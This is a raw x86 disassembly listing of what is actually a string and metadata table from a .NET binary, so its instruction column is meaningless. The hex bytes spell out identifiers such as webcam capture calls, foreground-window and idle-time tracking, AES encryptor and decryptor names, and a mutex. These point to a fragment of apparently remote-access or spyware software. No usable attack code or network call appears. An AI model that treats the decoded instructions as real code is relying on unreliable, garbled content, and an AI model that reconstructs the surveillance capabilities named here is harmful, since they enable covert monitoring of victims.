  406b19:	69 74 6f 72 69 6e 67 	imul   $0x676e69,0x72(%edi,%ebp,2),%esi
  406b20:	00 
  406b21:	44                   	inc    %esp
  406b22:	61                   	popa
  406b23:	74 61                	je     0x406b86
  406b25:	00 4f 70             	add    %cl,0x70(%edi)
  406b28:	65 6e                	outsb  %gs:(%esi),(%dx)
  406b2a:	55                   	push   %ebp
  406b2b:	72 6c                	jb     0x406b99
  406b2d:	00 55 72             	add    %dl,0x72(%ebp)
  406b30:	6c                   	insb   (%dx),%es:(%edi)
  406b31:	00 48 69             	add    %cl,0x69(%eax)
  406b34:	64 64 65 6e          	fs fs outsb %gs:(%esi),(%dx)
  406b38:	00 63 61             	add    %ah,0x61(%ebx)
  406b3b:	70 43                	jo     0x406b80
  406b3d:	72 65                	jb     0x406ba4
  406b3f:	61                   	popa
  406b40:	74 65                	je     0x406ba7
  406b42:	43                   	inc    %ebx
  406b43:	61                   	popa
  406b44:	70 74                	jo     0x406bba
  406b46:	75 72                	jne    0x406bba
  406b48:	65 57                	gs push %edi
  406b4a:	69 6e 64 6f 77 41 00 	imul   $0x41776f,0x64(%esi),%ebp
  406b51:	6c                   	insb   (%dx),%es:(%edi)
  406b52:	70 73                	jo     0x406bc7
  406b54:	7a 57                	jp     0x406bad
  406b56:	69 6e 64 6f 77 4e 61 	imul   $0x614e776f,0x64(%esi),%ebp
  406b5d:	6d                   	insl   (%dx),%es:(%edi)
  406b5e:	65 00 64 77 53       	add    %ah,%gs:0x53(%edi,%esi,2)
  406b63:	74 79                	je     0x406bde
  406b65:	6c                   	insb   (%dx),%es:(%edi)
  406b66:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  406b6a:	59                   	pop    %ecx
  406b6b:	00 6e 57             	add    %ch,0x57(%esi)
  406b6e:	69 64 74 68 00 6e 48 	imul   $0x65486e00,0x68(%esp,%esi,2),%esp
  406b75:	65 
  406b76:	69 67 68 74 00 68 77 	imul   $0x77680074,0x68(%edi),%esp
  406b7d:	6e                   	outsb  %ds:(%esi),(%dx)
  406b7e:	64 50                	fs push %eax
  406b80:	61                   	popa
  406b81:	72 65                	jb     0x406be8
  406b83:	6e                   	outsb  %ds:(%esi),(%dx)
  406b84:	74 00                	je     0x406b86
  406b86:	6e                   	outsb  %ds:(%esi),(%dx)
  406b87:	49                   	dec    %ecx
  406b88:	44                   	inc    %esp
  406b89:	00 48 61             	add    %cl,0x61(%eax)
  406b8c:	6e                   	outsb  %ds:(%esi),(%dx)
  406b8d:	64 6c                	fs insb (%dx),%es:(%edi)
  406b8f:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  406b93:	70 47                	jo     0x406bdc
  406b95:	65 74 44             	gs je  0x406bdc
  406b98:	72 69                	jb     0x406c03
  406b9a:	76 65                	jbe    0x406c01
  406b9c:	72 44                	jb     0x406be2
  406b9e:	65 73 63             	gs jae 0x406c04
  406ba1:	72 69                	jb     0x406c0c
  406ba3:	70 74                	jo     0x406c19
  406ba5:	69 6f 6e 41 00 77 44 	imul   $0x44770041,0x6e(%edi),%ebp
  406bac:	72 69                	jb     0x406c17
  406bae:	76 65                	jbe    0x406c15
  406bb0:	72 00                	jb     0x406bb2
  406bb2:	6c                   	insb   (%dx),%es:(%edi)
  406bb3:	70 73                	jo     0x406c28
  406bb5:	7a 4e                	jp     0x406c05
  406bb7:	61                   	popa
  406bb8:	6d                   	insl   (%dx),%es:(%edi)
  406bb9:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  406bbd:	4e                   	dec    %esi
  406bbe:	61                   	popa
  406bbf:	6d                   	insl   (%dx),%es:(%edi)
  406bc0:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
  406bc5:	7a 56                	jp     0x406c1d
  406bc7:	65 72 00             	gs jb  0x406bca
  406bca:	63 62 56             	arpl   %esp,0x56(%edx)
  406bcd:	65 72 00             	gs jb  0x406bd0
  406bd0:	43                   	inc    %ebx
  406bd1:	61                   	popa
  406bd2:	6d                   	insl   (%dx),%es:(%edi)
  406bd3:	00 52 75             	add    %dl,0x75(%edx)
  406bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  406bd7:	44                   	inc    %esp
  406bd8:	69 73 6b 00 45 78 74 	imul   $0x74784500,0x6b(%ebx),%esi
  406bdf:	65 6e                	outsb  %gs:(%esi),(%dx)
  406be1:	73 69                	jae    0x406c4c
  406be3:	6f                   	outsl  %ds:(%esi),(%dx)
  406be4:	6e                   	outsb  %ds:(%esi),(%dx)
  406be5:	00 4d 65             	add    %cl,0x65(%ebp)
  406be8:	6d                   	insl   (%dx),%es:(%edi)
  406be9:	6f                   	outsl  %ds:(%esi),(%dx)
  406bea:	72 79                	jb     0x406c65
  406bec:	00 62 75             	add    %ah,0x75(%edx)
  406bef:	66 66 65 72 00       	data16 data16 gs jb 0x406bf4
  406bf4:	55                   	push   %ebp
  406bf5:	4e                   	dec    %esi
  406bf6:	53                   	push   %ebx
  406bf7:	00 49 73             	add    %cl,0x73(%ecx)
  406bfa:	55                   	push   %ebp
  406bfb:	70 64                	jo     0x406c61
  406bfd:	61                   	popa
  406bfe:	74 65                	je     0x406c65
  406c00:	00 53 74             	add    %dl,0x74(%ebx)
  406c03:	72 00                	jb     0x406c05
  406c05:	44                   	inc    %esp
  406c06:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406c0a:	70 74                	jo     0x406c80
  406c0c:	00 69 6e             	add    %ch,0x6e(%ecx)
  406c0f:	70 75                	jo     0x406c86
  406c11:	74 00                	je     0x406c13
  406c13:	50                   	push   %eax
  406c14:	72 6f                	jb     0x406c85
  406c16:	63 65 73             	arpl   %esp,0x73(%ebp)
  406c19:	73 44                	jae    0x406c5f
  406c1b:	70 69                	jo     0x406c86
  406c1d:	00 53 65             	add    %dl,0x65(%ebx)
  406c20:	74 50                	je     0x406c72
  406c22:	72 6f                	jb     0x406c93
  406c24:	63 65 73             	arpl   %esp,0x73(%ebp)
  406c27:	73 44                	jae    0x406c6d
  406c29:	70 69                	jo     0x406c94
  406c2b:	41                   	inc    %ecx
  406c2c:	77 61                	ja     0x406c8f
  406c2e:	72 65                	jb     0x406c95
  406c30:	6e                   	outsb  %ds:(%esi),(%dx)
  406c31:	65 73 73             	gs jae 0x406ca7
  406c34:	00 61 77             	add    %ah,0x77(%ecx)
  406c37:	61                   	popa
  406c38:	72 65                	jb     0x406c9f
  406c3a:	6e                   	outsb  %ds:(%esi),(%dx)
  406c3b:	65 73 73             	gs jae 0x406cb1
  406c3e:	00 49 73             	add    %cl,0x73(%ecx)
  406c41:	56                   	push   %esi
  406c42:	61                   	popa
  406c43:	6c                   	insb   (%dx),%es:(%edi)
  406c44:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  406c4b:	6e 
  406c4c:	4e                   	dec    %esi
  406c4d:	61                   	popa
  406c4e:	6d                   	insl   (%dx),%es:(%edi)
  406c4f:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  406c53:	6d                   	insl   (%dx),%es:(%edi)
  406c54:	65 00 41 6c          	add    %al,%gs:0x6c(%ecx)
  406c58:	70 68                	jo     0x406cc2
  406c5a:	61                   	popa
  406c5b:	62 65 74             	bound  %esp,0x74(%ebp)
  406c5e:	00 52 61             	add    %dl,0x61(%edx)
  406c61:	6e                   	outsb  %ds:(%esi),(%dx)
  406c62:	64 6f                	outsl  %fs:(%esi),(%dx)
  406c64:	6d                   	insl   (%dx),%es:(%edi)
  406c65:	00 50 4c             	add    %dl,0x4c(%eax)
  406c68:	00 63 75             	add    %ah,0x75(%ebx)
  406c6b:	72 72                	jb     0x406cdf
  406c6d:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c6f:	74 00                	je     0x406c71
  406c71:	47                   	inc    %edi
  406c72:	65 74 52             	gs je  0x406cc7
  406c75:	61                   	popa
  406c76:	6e                   	outsb  %ds:(%esi),(%dx)
  406c77:	64 6f                	outsl  %fs:(%esi),(%dx)
  406c79:	6d                   	insl   (%dx),%es:(%edi)
  406c7a:	53                   	push   %ebx
  406c7b:	74 72                	je     0x406cef
  406c7d:	69 6e 67 00 6c 65 6e 	imul   $0x6e656c00,0x67(%esi),%ebp
  406c84:	67 74 68             	addr16 je 0x406cef
  406c87:	00 47 65             	add    %al,0x65(%edi)
  406c8a:	74 4c                	je     0x406cd8
  406c8c:	61                   	popa
  406c8d:	73 74                	jae    0x406d03
  406c8f:	49                   	dec    %ecx
  406c90:	6e                   	outsb  %ds:(%esi),(%dx)
  406c91:	70 75                	jo     0x406d08
  406c93:	74 49                	je     0x406cde
  406c95:	6e                   	outsb  %ds:(%esi),(%dx)
  406c96:	66 6f                	outsw  %ds:(%esi),(%dx)
  406c98:	00 70 6c             	add    %dh,0x6c(%eax)
  406c9b:	69 69 00 69 64 6c 65 	imul   $0x656c6469,0x0(%ecx),%ebp
  406ca2:	74 69                	je     0x406d0d
  406ca4:	6d                   	insl   (%dx),%es:(%edi)
  406ca5:	65 00 6c 61 73       	add    %ch,%gs:0x73(%ecx,%eiz,2)
  406caa:	74 49                	je     0x406cf5
  406cac:	6e                   	outsb  %ds:(%esi),(%dx)
  406cad:	70 75                	jo     0x406d24
  406caf:	74 49                	je     0x406cfa
  406cb1:	6e                   	outsb  %ds:(%esi),(%dx)
  406cb2:	66 00 47 65          	data16 add %al,0x65(%edi)
  406cb6:	74 4c                	je     0x406d04
  406cb8:	61                   	popa
  406cb9:	73 74                	jae    0x406d2f
  406cbb:	49                   	dec    %ecx
  406cbc:	6e                   	outsb  %ds:(%esi),(%dx)
  406cbd:	70 75                	jo     0x406d34
  406cbf:	74 54                	je     0x406d15
  406cc1:	69 6d 65 00 54 69 6d 	imul   $0x6d695400,0x65(%ebp),%ebp
  406cc8:	65 53                	gs push %ebx
  406cca:	70 61                	jo     0x406d2d
  406ccc:	6e                   	outsb  %ds:(%esi),(%dx)
  406ccd:	00 73 75             	add    %dh,0x75(%ebx)
  406cd0:	6d                   	insl   (%dx),%es:(%edi)
  406cd1:	6f                   	outsl  %ds:(%esi),(%dx)
  406cd2:	66 69 64 6c 65 74 69 	imul   $0x6974,0x65(%esp,%ebp,2),%sp
  406cd9:	6d                   	insl   (%dx),%es:(%edi)
  406cda:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  406cdf:	74 4c                	je     0x406d2d
  406ce1:	61                   	popa
  406ce2:	73 74                	jae    0x406d58
  406ce4:	49                   	dec    %ecx
  406ce5:	64 6c                	fs insb (%dx),%es:(%edi)
  406ce7:	65 74 69             	gs je  0x406d53
  406cea:	6d                   	insl   (%dx),%es:(%edi)
  406ceb:	65 00 54 69 6d       	add    %dl,%gs:0x6d(%ecx,%ebp,2)
  406cf0:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  406cf5:	74 41                	je     0x406d38
  406cf7:	63 74 00 75          	arpl   %esi,0x75(%eax,%eax,1)
  406cfb:	73 65                	jae    0x406d62
  406cfd:	72 41                	jb     0x406d40
  406cff:	67 65 6e             	outsb  %gs:(%si),(%dx)
  406d02:	74 73                	je     0x406d77
  406d04:	00 47 65             	add    %al,0x65(%edi)
  406d07:	74 46                	je     0x406d4f
  406d09:	6f                   	outsl  %ds:(%esi),(%dx)
  406d0a:	72 65                	jb     0x406d71
  406d0c:	67 72 6f             	addr16 jb 0x406d7e
  406d0f:	75 6e                	jne    0x406d7f
  406d11:	64 57                	fs push %edi
  406d13:	69 6e 64 6f 77 00 53 	imul   $0x5300776f,0x64(%esi),%ebp
  406d1a:	79 73                	jns    0x406d8f
  406d1c:	74 65                	je     0x406d83
  406d1e:	6d                   	insl   (%dx),%es:(%edi)
  406d1f:	2e 54                	cs push %esp
  406d21:	65 78 74             	gs js  0x406d98
  406d24:	00 53 74             	add    %dl,0x74(%ebx)
  406d27:	72 69                	jb     0x406d92
  406d29:	6e                   	outsb  %ds:(%esi),(%dx)
  406d2a:	67 42                	addr16 inc %edx
  406d2c:	75 69                	jne    0x406d97
  406d2e:	6c                   	insb   (%dx),%es:(%edi)
  406d2f:	64 65 72 00          	fs gs jb 0x406d33
  406d33:	47                   	inc    %edi
  406d34:	65 74 57             	gs je  0x406d8e
  406d37:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  406d3e:	78 74                	js     0x406db4
  406d40:	00 68 57             	add    %ch,0x57(%eax)
  406d43:	6e                   	outsb  %ds:(%esi),(%dx)
  406d44:	64 00 74 65 78       	add    %dh,%fs:0x78(%ebp,%eiz,2)
  406d49:	74 00                	je     0x406d4b
  406d4b:	63 6f 75             	arpl   %ebp,0x75(%edi)
  406d4e:	6e                   	outsb  %ds:(%esi),(%dx)
  406d4f:	74 00                	je     0x406d51
  406d51:	53                   	push   %ebx
  406d52:	65 74 54             	gs je  0x406da9
  406d55:	68 72 65 61 64       	push   $0x64616572
  406d5a:	45                   	inc    %ebp
  406d5b:	78 65                	js     0x406dc2
  406d5d:	63 75 74             	arpl   %esi,0x74(%ebp)
  406d60:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  406d67:	65 00 65 73          	add    %ah,%gs:0x73(%ebp)
  406d6b:	46                   	inc    %esi
  406d6c:	6c                   	insb   (%dx),%es:(%edi)
  406d6d:	61                   	popa
  406d6e:	67 73 00             	addr16 jae 0x406d71
  406d71:	50                   	push   %eax
  406d72:	72 65                	jb     0x406dd9
  406d74:	76 65                	jbe    0x406ddb
  406d76:	6e                   	outsb  %ds:(%esi),(%dx)
  406d77:	74 53                	je     0x406dcc
  406d79:	6c                   	insb   (%dx),%es:(%edi)
  406d7a:	65 65 70 00          	gs gs jo 0x406d7e
  406d7e:	47                   	inc    %edi
  406d7f:	65 74 41             	gs je  0x406dc3
  406d82:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406d86:	65 57                	gs push %edi
  406d88:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  406d8f:	74 6c                	je     0x406dfd
  406d91:	65 00 53 42          	add    %dl,%gs:0x42(%ebx)
  406d95:	00 73 00             	add    %dh,0x0(%ebx)
  406d98:	42                   	inc    %edx
  406d99:	53                   	push   %ebx
  406d9a:	00 49 44             	add    %cl,0x44(%ecx)
  406d9d:	00 47 65             	add    %al,0x65(%edi)
  406da0:	74 48                	je     0x406dea
  406da2:	61                   	popa
  406da3:	73 68                	jae    0x406e0d
  406da5:	54                   	push   %esp
  406da6:	00 73 74             	add    %dh,0x74(%ebx)
  406da9:	72 54                	jb     0x406dff
  406dab:	6f                   	outsl  %ds:(%esi),(%dx)
  406dac:	48                   	dec    %eax
  406dad:	61                   	popa
  406dae:	73 68                	jae    0x406e18
  406db0:	00 53 65             	add    %dl,0x65(%ebx)
  406db3:	74 56                	je     0x406e0b
  406db5:	61                   	popa
  406db6:	6c                   	insb   (%dx),%es:(%edi)
  406db7:	75 65                	jne    0x406e1e
  406db9:	00 76 61             	add    %dh,0x61(%esi)
  406dbc:	6c                   	insb   (%dx),%es:(%edi)
  406dbd:	75 65                	jne    0x406e24
  406dbf:	00 47 65             	add    %al,0x65(%edi)
  406dc2:	74 56                	je     0x406e1a
  406dc4:	61                   	popa
  406dc5:	6c                   	insb   (%dx),%es:(%edi)
  406dc6:	75 65                	jne    0x406e2d
  406dc8:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  406dcc:	6f                   	outsl  %ds:(%esi),(%dx)
  406dcd:	6d                   	insl   (%dx),%es:(%edi)
  406dce:	70 72                	jo     0x406e42
  406dd0:	65 73 73             	gs jae 0x406e46
  406dd3:	00 43 6f             	add    %al,0x6f(%ebx)
  406dd6:	6d                   	insl   (%dx),%es:(%edi)
  406dd7:	70 72                	jo     0x406e4b
  406dd9:	65 73 73             	gs jae 0x406e4f
  406ddc:	00 41 45             	add    %al,0x45(%ecx)
  406ddf:	53                   	push   %ebx
  406de0:	5f                   	pop    %edi
  406de1:	45                   	inc    %ebp
  406de2:	6e                   	outsb  %ds:(%esi),(%dx)
  406de3:	63 72 79             	arpl   %esi,0x79(%edx)
  406de6:	70 74                	jo     0x406e5c
  406de8:	6f                   	outsl  %ds:(%esi),(%dx)
  406de9:	72 00                	jb     0x406deb
  406deb:	41                   	inc    %ecx
  406dec:	45                   	inc    %ebp
  406ded:	53                   	push   %ebx
  406dee:	5f                   	pop    %edi
  406def:	44                   	inc    %esp
  406df0:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406df4:	70 74                	jo     0x406e6a
  406df6:	6f                   	outsl  %ds:(%esi),(%dx)
  406df7:	72 00                	jb     0x406df9
  406df9:	5f                   	pop    %edi
  406dfa:	61                   	popa
  406dfb:	70 70                	jo     0x406e6d
  406dfd:	4d                   	dec    %ebp
  406dfe:	75 74                	jne    0x406e74
  406e00:	65 78 00             	gs js  0x406e03
  406e03:	43                   	inc    %ebx
  406e04:	72 65                	jb     0x406e6b
  406e06:	61                   	popa
  406e07:	74 65                	je     0x406e6e
  406e09:	4d                   	dec    %ebp
  406e0a:	75 74                	jne    0x406e80
  406e0c:	65 78 00             	gs js  0x406e0f
  406e0f:	43                   	inc    %ebx
  406e10:	6c                   	insb   (%dx),%es:(%edi)
  406e11:	6f                   	outsl  %ds:(%esi),(%dx)
  406e12:	73 65                	jae    0x406e79
  406e14:	4d                   	dec    %ebp
  406e15:	75 74                	jne    0x406e8b
  406e17:	65 78 00             	gs js  0x406e1a
  406e1a:	56                   	push   %esi
  406e1b:	61                   	popa
  406e1c:	6c                   	insb   (%dx),%es:(%edi)
  406e1d:	75 65                	jne    0x406e84
  406e1f:	54                   	push   %esp
  406e20:	79 70                	jns    0x406e92
  406e22:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  406e26:	53                   	push   %ebx
  406e27:	69 7a 65 00 64 77 54 	imul   $0x54776400,0x65(%edx),%edi
  406e2e:	69 6d 65 00 45 6e 75 	imul   $0x756e4500,0x65(%ebp),%ebp
  406e35:	6d                   	insl   (%dx),%es:(%edi)
  406e36:	00 76 61             	add    %dh,0x61(%esi)
  406e39:	6c                   	insb   (%dx),%es:(%edi)
  406e3a:	75 65                	jne    0x406ea1
  406e3c:	5f                   	pop    %edi
  406e3d:	5f                   	pop    %edi
  406e3e:	00 45 53             	add    %al,0x53(%ebp)
  406e41:	5f                   	pop    %edi
  406e42:	43                   	inc    %ebx
  406e43:	4f                   	dec    %edi
  406e44:	4e                   	dec    %esi
  406e45:	54                   	push   %esp
  406e46:	49                   	dec    %ecx
  406e47:	4e                   	dec    %esi
  406e48:	55                   	push   %ebp
  406e49:	4f                   	dec    %edi
  406e4a:	55                   	push   %ebp
  406e4b:	53                   	push   %ebx
  406e4c:	00 45 53             	add    %al,0x53(%ebp)
  406e4f:	5f                   	pop    %edi
  406e50:	44                   	inc    %esp
  406e51:	49                   	dec    %ecx
  406e52:	53                   	push   %ebx
  406e53:	50                   	push   %eax
  406e54:	4c                   	dec    %esp
  406e55:	41                   	inc    %ecx
  406e56:	59                   	pop    %ecx
  406e57:	5f                   	pop    %edi
  406e58:	52                   	push   %edx
  406e59:	45                   	inc    %ebp
  406e5a:	51                   	push   %ecx
  406e5b:	55                   	push   %ebp
  406e5c:	49                   	dec    %ecx
  406e5d:	52                   	push   %edx
  406e5e:	45                   	inc    %ebp
  406e5f:	44                   	inc    %esp
  406e60:	00 45 53             	add    %al,0x53(%ebp)
  406e63:	5f                   	pop    %edi
  406e64:	53                   	push   %ebx
  406e65:	59                   	pop    %ecx
  406e66:	53                   	push   %ebx
  406e67:	54                   	push   %esp
  406e68:	45                   	inc    %ebp
  406e69:	4d                   	dec    %ebp
  406e6a:	5f                   	pop    %edi
  406e6b:	52                   	push   %edx
  406e6c:	45                   	inc    %ebp
  406e6d:	51                   	push   %ecx
  406e6e:	55                   	push   %ebp
  406e6f:	49                   	dec    %ecx
  406e70:	52                   	push   %edx
  406e71:	45                   	inc    %ebp
  406e72:	44                   	inc    %esp
  406e73:	00 53 79             	add    %dl,0x79(%ebx)
  406e76:	73 74                	jae    0x406eec
  406e78:	65 6d                	gs insl (%dx),%es:(%edi)
  406e7a:	2e 43                	cs inc %ebx
  406e7c:	6f                   	outsl  %ds:(%esi),(%dx)
  406e7d:	6d                   	insl   (%dx),%es:(%edi)
  406e7e:	70 6f                	jo     0x406eef
  406e80:	6e                   	outsb  %ds:(%esi),(%dx)
  406e81:	65 6e                	outsb  %gs:(%esi),(%dx)
  406e83:	74 4d                	je     0x406ed2
  406e85:	6f                   	outsl  %ds:(%esi),(%dx)
  406e86:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  406e89:	00 45 64             	add    %al,0x64(%ebp)
  406e8c:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  406e93:	77 
  406e94:	73 61                	jae    0x406ef7
  406e96:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406e9a:	74 74                	je     0x406f10
  406e9c:	72 69                	jb     0x406f07
  406e9e:	62 75 74             	bound  %esi,0x74(%ebp)
  406ea1:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  406ea5:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  406eac:	77 
  406ead:	73 61                	jae    0x406f10
  406eaf:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  406eb3:	74 61                	je     0x406f16
  406eb5:	74 65                	je     0x406f1c
  406eb7:	00 53 79             	add    %dl,0x79(%ebx)
  406eba:	73 74                	jae    0x406f30
  406ebc:	65 6d                	gs insl (%dx),%es:(%edi)
  406ebe:	2e 43                	cs inc %ebx
  406ec0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ec1:	64 65 44             	fs gs inc %esp
  406ec4:	6f                   	outsl  %ds:(%esi),(%dx)
  406ec5:	6d                   	insl   (%dx),%es:(%edi)
  406ec6:	2e 43                	cs inc %ebx
  406ec8:	6f                   	outsl  %ds:(%esi),(%dx)
  406ec9:	6d                   	insl   (%dx),%es:(%edi)
  406eca:	70 69                	jo     0x406f35
  406ecc:	6c                   	insb   (%dx),%es:(%edi)
  406ecd:	65 72 00             	gs jb  0x406ed0
  406ed0:	47                   	inc    %edi
  406ed1:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ed3:	65 72 61             	gs jb  0x406f37
  406ed6:	74 65                	je     0x406f3d
  406ed8:	64 43                	fs inc %ebx
  406eda:	6f                   	outsl  %ds:(%esi),(%dx)
  406edb:	64 65 41             	fs gs inc %ecx
  406ede:	74 74                	je     0x406f54
  406ee0:	72 69                	jb     0x406f4b
  406ee2:	62 75 74             	bound  %esi,0x74(%ebp)
  406ee5:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  406ee9:	73 74                	jae    0x406f5f
  406eeb:	65 6d                	gs insl (%dx),%es:(%edi)
  406eed:	2e 44                	cs inc %esp
  406eef:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406ef6:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  406efd:	75 67                	jne    0x406f66
  406eff:	67 65 72 48          	addr16 gs jb 0x406f4b
  406f03:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  406f0a:	74 
  406f0b:	72 69                	jb     0x406f76
  406f0d:	62 75 74             	bound  %esi,0x74(%ebp)
  406f10:	65 00 4d 69          	add    %cl,%gs:0x69(%ebp)
  406f14:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406f17:	73 6f                	jae    0x406f88
  406f19:	66 74 2e             	data16 je 0x406f4a
  406f1c:	56                   	push   %esi
  406f1d:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  406f24:	73 69                	jae    0x406f8f
  406f26:	63 2e                	arpl   %ebp,(%esi)
  406f28:	43                   	inc    %ebx
  406f29:	6f                   	outsl  %ds:(%esi),(%dx)
  406f2a:	6d                   	insl   (%dx),%es:(%edi)
  406f2b:	70 69                	jo     0x406f96
  406f2d:	6c                   	insb   (%dx),%es:(%edi)
  406f2e:	65 72 53             	gs jb  0x406f84
  406f31:	65 72 76             	gs jb  0x406faa
  406f34:	69 63 65 73 00 53 74 	imul   $0x74530073,0x65(%ebx),%esp
  406f3b:	61                   	popa
  406f3c:	6e                   	outsb  %ds:(%esi),(%dx)
  406f3d:	64 61                	fs popa
  406f3f:	72 64                	jb     0x406fa5
  406f41:	4d                   	dec    %ebp
  406f42:	6f                   	outsl  %ds:(%esi),(%dx)
  406f43:	64 75 6c             	fs jne 0x406fb2
  406f46:	65 41                	gs inc %ecx
  406f48:	74 74                	je     0x406fbe
  406f4a:	72 69                	jb     0x406fb5
  406f4c:	62 75 74             	bound  %esi,0x74(%ebp)
  406f4f:	65 00 48 69          	add    %cl,%gs:0x69(%eax)
  406f53:	64 65 4d             	fs gs dec %ebp
  406f56:	6f                   	outsl  %ds:(%esi),(%dx)
  406f57:	64 75 6c             	fs jne 0x406fc6
  406f5a:	65 4e                	gs dec %esi
  406f5c:	61                   	popa
  406f5d:	6d                   	insl   (%dx),%es:(%edi)
  406f5e:	65 41                	gs inc %ecx
  406f60:	74 74                	je     0x406fd6
  406f62:	72 69                	jb     0x406fcd
  406f64:	62 75 74             	bound  %esi,0x74(%ebp)
  406f67:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  406f6b:	73 74                	jae    0x406fe1
  406f6d:	65 6d                	gs insl (%dx),%es:(%edi)
  406f6f:	2e 43                	cs inc %ebx
  406f71:	6f                   	outsl  %ds:(%esi),(%dx)
  406f72:	6d                   	insl   (%dx),%es:(%edi)
  406f73:	70 6f                	jo     0x406fe4
  406f75:	6e                   	outsb  %ds:(%esi),(%dx)
  406f76:	65 6e                	outsb  %gs:(%esi),(%dx)
  406f78:	74 4d                	je     0x406fc7
  406f7a:	6f                   	outsl  %ds:(%esi),(%dx)
  406f7b:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  406f7e:	2e 44                	cs inc %esp
  406f80:	65 73 69             	gs jae 0x406fec
  406f83:	67 6e                	outsb  %ds:(%si),(%dx)
  406f85:	00 48 65             	add    %cl,0x65(%eax)
  406f88:	6c                   	insb   (%dx),%es:(%edi)
  406f89:	70 4b                	jo     0x406fd6
  406f8b:	65 79 77             	gs jns 0x407005
  406f8e:	6f                   	outsl  %ds:(%esi),(%dx)
  406f8f:	72 64                	jb     0x406ff5
  406f91:	41                   	inc    %ecx
  406f92:	74 74                	je     0x407008
  406f94:	72 69                	jb     0x406fff
  406f96:	62 75 74             	bound  %esi,0x74(%ebp)
  406f99:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  406f9d:	73 74                	jae    0x407013
  406f9f:	65 6d                	gs insl (%dx),%es:(%edi)
  406fa1:	2e 52                	cs push %edx
  406fa3:	75 6e                	jne    0x407013
  406fa5:	74 69                	je     0x407010
  406fa7:	6d                   	insl   (%dx),%es:(%edi)
  406fa8:	65 2e 43             	gs cs inc %ebx
  406fab:	6f                   	outsl  %ds:(%esi),(%dx)
  406fac:	6d                   	insl   (%dx),%es:(%edi)
  406fad:	70 69                	jo     0x407018
  406faf:	6c                   	insb   (%dx),%es:(%edi)
  406fb0:	65 72 53             	gs jb  0x407006
  406fb3:	65 72 76             	gs jb  0x40702c
  406fb6:	69 63 65 73 00 52 75 	imul   $0x75520073,0x65(%ebx),%esp
  406fbd:	6e                   	outsb  %ds:(%esi),(%dx)
  406fbe:	74 69                	je     0x407029
  406fc0:	6d                   	insl   (%dx),%es:(%edi)
  406fc1:	65 48                	gs dec %eax
  406fc3:	65 6c                	gs insb (%dx),%es:(%edi)
  406fc5:	70 65                	jo     0x40702c
  406fc7:	72 73                	jb     0x40703c
  406fc9:	00 47 65             	add    %al,0x65(%edi)
  406fcc:	74 4f                	je     0x40701d
  406fce:	62 6a 65             	bound  %ebp,0x65(%edx)
  406fd1:	63 74 56 61          	arpl   %esi,0x61(%esi,%edx,2)
  406fd5:	6c                   	insb   (%dx),%es:(%edi)
  406fd6:	75 65                	jne    0x40703d
  406fd8:	00 52 75             	add    %dl,0x75(%edx)
  406fdb:	6e                   	outsb  %ds:(%esi),(%dx)
  406fdc:	74 69                	je     0x407047
  406fde:	6d                   	insl   (%dx),%es:(%edi)
  406fdf:	65 54                	gs push %esp
  406fe1:	79 70                	jns    0x407053
  406fe3:	65 48                	gs dec %eax
  406fe5:	61                   	popa
  406fe6:	6e                   	outsb  %ds:(%esi),(%dx)
  406fe7:	64 6c                	fs insb (%dx),%es:(%edi)
  406fe9:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  406fed:	74 54                	je     0x407043
  406fef:	79 70                	jns    0x407061
  406ff1:	65 46                	gs inc %esi
  406ff3:	72 6f                	jb     0x407064
  406ff5:	6d                   	insl   (%dx),%es:(%edi)
  406ff6:	48                   	dec    %eax
  406ff7:	61                   	popa
  406ff8:	6e                   	outsb  %ds:(%esi),(%dx)
  406ff9:	64 6c                	fs insb (%dx),%es:(%edi)
  406ffb:	65 00 41 63          	add    %al,%gs:0x63(%ecx)
  406fff:	74 69                	je     0x40706a
  407001:	76 61                	jbe    0x407064
  407003:	74 6f                	je     0x407074
  407005:	72 00                	jb     0x407007
  407007:	43                   	inc    %ebx
  407008:	72 65                	jb     0x40706f
  40700a:	61                   	popa
  40700b:	74 65                	je     0x407072
  40700d:	49                   	dec    %ecx
  40700e:	6e                   	outsb  %ds:(%esi),(%dx)
  40700f:	73 74                	jae    0x407085
  407011:	61                   	popa
  407012:	6e                   	outsb  %ds:(%esi),(%dx)
  407013:	63 65 00             	arpl   %esp,0x0(%ebp)
